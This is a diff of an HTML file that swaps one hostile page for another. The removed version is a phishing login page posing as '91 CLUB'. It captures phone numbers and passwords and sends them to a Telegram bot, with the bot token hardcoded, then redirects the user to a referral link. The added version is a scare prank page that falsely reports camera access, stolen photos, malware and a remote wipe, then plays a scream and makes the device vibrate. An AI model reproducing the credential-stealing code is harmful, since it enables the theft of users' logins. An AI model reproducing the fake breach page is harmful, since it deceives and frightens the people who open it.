@@ -1,76 +1,107 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>91 CLUB Login</title>
+  <meta charset="UTF-8" />
+  <title>System Override</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
-      background: #f5f5f5;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      text-align: center;
-      padding-top: 60px;
-    }
-    input, button {
-      padding: 12px;
-      margin: 10px;
-      width: 280px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
+      margin: 0;
+      background-color: black;
+      color: lime;
+      font-family: monospace;
       font-size: 16px;
+      overflow: hidden;
     }
-    button {
-      background-color: #28a745;
+    #terminal {
+      white-space: pre-wrap;
+      padding: 20px;
+    }
+    .redscreen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: red;
+      z-index: 9999;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
       color: white;
+      text-align: center;
+    }
+    .btn {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background: white;
+      color: black;
       font-weight: bold;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #218838;
-    }
-    h2 {
-      color: #333;
+      border: none;
+      border-radius: 8px;
+      text-decoration: none;
     }
   </style>
 </head>
 <body>
+  <div id="terminal"></div>
 
-  <h2>91 CLUB - Login</h2>
-  <input type="text" id="phone" placeholder="Phone Number"><br>
-  <input type="password" id="pass" placeholder="Password"><br>
-  <button onclick="sendData()">Login</button>
+  <div class="redscreen" id="redscreen">
+    <h1>🔴 SYSTEM OVERRIDE DETECTED</h1>
+    <p>System breach complete. You're being watched 👁</p>
+    <a href="https://www.instagram.com/vipin_txt?igsh=b2s2dzljbDZqcmxy" class="btn">👨‍💻 Meet the Developer</a>
+  </div>
+
+  <audio id="scream" src="https://www.soundjay.com/human/sounds/scream-01.mp3"></audio>
 
   <script>
-    async function sendData() {
-      const phone = document.getElementById("phone").value;
-      const pass = document.getElementById("pass").value;
+    const lines = [
+      "Initializing system kernel...",
+      "Checking boot integrity...",
+      "✔️ Boot loader found",
+      "📡 IP traced: 192.168.1.66",
+      "Accessing camera... ✅",
+      "Accessing mic... ✅",
+      "Uploading photos to dark web...",
+      "⚠️ Malware injected: Android.Backdoor.Agent",
+      "Instagram cloned to: vipin_clone_839",
+      "Accessing saved passwords...",
+      "🔐 OTP sync enabled",
+      "Reading chats... Telegram, WhatsApp, Instagram",
+      "📴 Remote wipe in progress...",
+      "🔴 LOCKDOWN MODE ENABLED!",
+      "Ghost detected nearby using infrared sensor...",
+      "💀 SYSTEM OVERRIDE IN 3...",
+      "💀 SYSTEM OVERRIDE IN 2...",
+      "💀 SYSTEM OVERRIDE IN 1..."
+    ];
 
-      if (phone === "" || pass === "") {
-        alert("Please fill in both fields.");
-        return;
+    const terminal = document.getElementById("terminal");
+    const redscreen = document.getElementById("redscreen");
+    const scream = document.getElementById("scream");
+
+    let i = 0;
+    function showLine() {
+      if (i < lines.length) {
+        terminal.innerHTML += lines[i] + "\n";
+        window.scrollTo(0, document.body.scrollHeight);
+        i++;
+        navigator.vibrate(200);
+        setTimeout(showLine, 1000);
+      } else {
+        triggerRedScreen();
       }
-
-      const token = "8290146183:AAFD63I79f0zSPM4s9GMDJ324Nc8o84VP-s";
-      const chat_id = "7882702142";
-      const text = `📥 *91 CLUB Login*\n📱 Phone: ${phone}\n🔐 Pass: ${pass}`;
-
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-      await fetch(url, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: chat_id,
-          text: text,
-          parse_mode: "Markdown"
-        })
-      });
-
-      // Redirect user
-      window.location.href = "https://www.91222.in/#/register?invitationCode=281861899551";
     }
-  </script>
 
+    function triggerRedScreen() {
+      redscreen.style.display = "flex";
+      scream.play();
+      document.body.style.backgroundColor = "red";
+      navigator.vibrate([500, 200, 500, 200, 1000]);
+    }
+
+    window.onload = showLine;
+  </script>
 </body>
-</html>
+</html>￼Enter
